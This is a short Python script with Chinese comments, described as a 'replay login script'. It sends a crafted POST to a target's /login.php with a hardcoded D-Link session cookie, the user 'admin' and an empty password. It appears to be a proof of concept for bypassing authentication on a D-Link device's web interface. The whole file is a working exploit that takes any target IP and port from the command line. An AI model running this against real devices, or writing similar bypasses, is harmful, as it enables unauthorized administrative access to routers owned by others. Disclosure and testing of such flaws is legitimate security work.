import argparse
import requests

def replay_login(ip, port):
    # 定义目标URL
    url = f"http://{ip}:{port}/login.php"
    
    # 定义请求头
    headers = {
        "Host": f"{ip}:{port}",
        "Cache-Control": "max-age=0",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Origin": f"http://{ip}:{port}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"http://{ip}:{port}/login.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "dlink_uid=pswghpukk",
        "Connection": "keep-alive"
    }
    
    # 定义表单数据
    data = {
        "ACTION_POST": "LOGIN",
        "f_date": "",
        "f_time": "",
        "LOGIN_USER": "admin",
        "LOGIN_PASSWD": "",
        "login": " Login "
    }
    
    # 发送POST请求
    try:
        response = requests.post(url, headers=headers, data=data)
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Text: {response.text}")
    except requests.RequestException as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replay login script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, help='Target port')
    args = parser.parse_args()
    replay_login(args.ip, args.port)
